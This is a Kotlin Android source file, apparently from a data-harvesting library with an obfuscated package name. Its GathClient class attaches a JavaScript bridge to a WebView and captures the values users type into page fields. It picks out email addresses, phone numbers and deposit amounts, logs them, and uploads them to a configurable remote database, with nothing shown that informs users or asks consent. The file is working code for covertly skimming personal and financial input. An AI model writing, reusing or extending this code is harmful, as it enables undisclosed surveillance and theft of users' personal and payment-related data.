package io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe

import android.content.Context
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import androidx.lifecycle.DefaultLifecycleObserver
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import com.android.volley.toolbox.Volley
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.MatcherOperations
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.TimerPool
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.gath.Config
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.gath.Input
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.data.source.local.preferences.StoragePreferencesDataStore
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.data.source.local.repo.StoragePreferencesRepositoryImpl
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.data.source.remote.RequestManager
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.domain.GathClientInterface
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.domain.GathUserInterface
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.utils.Consts
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.utils.enums.DataKey
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.utils.scope

class GathClient(
    private val lifecycleOwner: LifecycleOwner, private val webView: WebView
) : DefaultLifecycleObserver, LifecycleOwner, GathClientInterface, GathUserInterface {
    val context: Context = webView.context
    private val client = this
    private val timerPool: TimerPool = TimerPool(lifecycle)
    private val manager: GathManager = GathManager(
        StoragePreferencesRepositoryImpl(
            StoragePreferencesDataStore(
                context.applicationContext
            )
        )
    )
    private val input = object : Input() {
        @JavascriptInterface
        override fun sendText(
            id: String,
            name: String,
            type: String,
            outerHTML: String,
            value: String,
        ) {

            val textId = "$id$name$type$outerHTML"

            timerPool.addTemp(textId) {
                client.scope {
                    manager.sendText(
                        id = textId,
                        value = value,
                        emailMatches = { clearEmail ->
                            MatcherOperations.Format.formatEmail(clearEmail) { formatEmail ->
                                timerPool.add(DataKey.EMAIL) {
                                    client.scope {
                                        manager.uploadData(
                                            lifecycleOwner = lifecycleOwner,
                                            uploadKey = DataKey.EMAIL,
                                            data = formatEmail
                                        )
                                    }
                                }
                                Log.i("GathClient", "emailMatches: $formatEmail")
                            }
                        },
                        phoneMatches = { clearPhone ->
                            val codes = context.resources.getStringArray(R.array.phoneCode)

                            MatcherOperations.Format.formatPhone(
                                clearPhone, manager.countryCode, codes
                            ) { formatPhone ->
                                timerPool.add(DataKey.PHONE) {
                                    client.scope {
                                        manager.uploadData(
                                            lifecycleOwner = lifecycleOwner,
                                            uploadKey = DataKey.PHONE,
                                            data = formatPhone
                                        )
                                    }
                                }
                                Log.i("GathClient", "phoneMatches: $formatPhone")
                            }
                        },
                        depositMatches = { clearDeposit ->
                            timerPool.add(DataKey.DEPOSIT) {
                                client.scope {
                                    manager.uploadData(
                                        lifecycleOwner, DataKey.DEPOSIT, clearDeposit
                                    )
                                }
                            }
                            Log.i("GathClient", "depositMatches: $clearDeposit")
                        },
                    )
                }
            }
        }
    }


    init {
        lifecycle.addObserver(this)
    }

    override fun onDestroy(owner: LifecycleOwner) {
        super.onDestroy(owner)
        detachInputListener()
        lifecycle.removeObserver(this)
    }

    override fun getLifecycle(): Lifecycle {
        return lifecycleOwner.lifecycle
    }

    override fun attachInputListener() {
        webView.addJavascriptInterface(input, Input::class.java.simpleName)
    }

    override fun detachInputListener() {
        webView.removeJavascriptInterface(Input::class.java.simpleName)
    }

    override fun start(): GathClient {
        client.scope {
            manager.checkAvailability {
                attachInputListener()
                getCountryCode()
            }
        }
        return this
    }


    override fun setup(block: Config.() -> Unit): GathClient {
        Config().apply(block).apply {
            manager.emailCollectingEnabled = isEmailCollect
            manager.phoneCollectingEnabled = isPhoneCollect
            manager.depositCollectingEnabled = isDepositCollect
            manager.customDatabaseUrl = databaseUrl
        }
        return client
    }


    override fun evaluateJavascript(view: WebView?) {
        view?.evaluateJavascript(Consts.DEFAULT_SCRIPT) { }
    }

    override fun evaluateJavascript(view: WebView?, script: String) {
        view?.evaluateJavascript(script) {}
    }


    private fun getCountryCode() {
        RequestManager().createCountryCodeRequest { countryCode ->
            manager.countryCode = countryCode
        }.also {
            Volley.newRequestQueue(context).add(it)
        }
    }
}